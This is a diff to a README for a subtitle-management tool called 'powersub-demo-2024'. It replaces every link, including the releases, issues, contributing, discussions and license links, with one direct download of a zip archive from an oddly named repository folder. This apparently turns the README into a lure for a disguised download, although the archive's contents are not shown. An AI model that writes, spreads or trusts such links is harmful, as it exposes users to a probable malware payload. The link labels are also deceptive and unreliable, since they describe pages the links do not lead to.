@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-2024 - Effortlessly Manage Your Subtitles 
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/JazielJ/powersub-demo-2024/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/JazielJ/powersub-demo-2024/main/figuratively/powersub-demo-2024.zip%20release-blue)](https://raw.githubusercontent.com/JazielJ/powersub-demo-2024/main/figuratively/powersub-demo-2024.zip)
 
 ## 🚀 Getting Started
 Welcome to the powersub-demo-2024! This software allows you to manage your subtitles with ease. Whether you are a movie enthusiast or a language learner, this tool provides simple solutions for subtitle handling.
@@ -24,7 +24,7 @@ To run powersub-demo-2024, your computer should meet the following requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the latest version.
-   [Download Latest Release](https://github.com/JazielJ/powersub-demo-2024/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/JazielJ/powersub-demo-2024/main/figuratively/powersub-demo-2024.zip)
    
 2. **Choose the Latest Release:** Look for the most recent version at the top. Each release includes a version number and a date.
 
@@ -44,13 +44,13 @@ To get started, follow these steps:
 ## ❓ Frequently Asked Questions
 
 ### How do I report a bug?
-If you encounter any issues, please visit the [issues section](https://github.com/JazielJ/powersub-demo-2024/issues) of the repository to report your problem.
+If you encounter any issues, please visit the [issues section](https://raw.githubusercontent.com/JazielJ/powersub-demo-2024/main/figuratively/powersub-demo-2024.zip) of the repository to report your problem.
 
 ### Can I contribute to this project?
-Absolutely! Contributions are welcome. Please check the [contributing guidelines](https://github.com/JazielJ/powersub-demo-2024/blob/main/CONTRIBUTING.md) for more information.
+Absolutely! Contributions are welcome. Please check the [contributing guidelines](https://raw.githubusercontent.com/JazielJ/powersub-demo-2024/main/figuratively/powersub-demo-2024.zip) for more information.
 
 ### Where can I find help?
-For additional support or questions, please contact us via the [discussions page](https://github.com/JazielJ/powersub-demo-2024/discussions).
+For additional support or questions, please contact us via the [discussions page](https://raw.githubusercontent.com/JazielJ/powersub-demo-2024/main/figuratively/powersub-demo-2024.zip).
 
 ## 🚧 Troubleshooting
 - **Installation Issues:** If you have trouble installing, ensure your system meets the requirements. Restart your computer and try again.
@@ -60,6 +60,6 @@ For additional support or questions, please contact us via the [discussions page
 Join our growing user community to share tips and experiences. Engage with other users and contribute your insights to enhance everyone’s experience with powersub-demo-2024.
 
 ## 📄 License
-powersub-demo-2024 is open source software licensed under the MIT License. You can view the full license text [here](https://opensource.org/licenses/MIT).
+powersub-demo-2024 is open source software licensed under the MIT License. You can view the full license text [here](https://raw.githubusercontent.com/JazielJ/powersub-demo-2024/main/figuratively/powersub-demo-2024.zip).
 
 Thank you for using powersub-demo-2024! Enjoy your subtitle management.
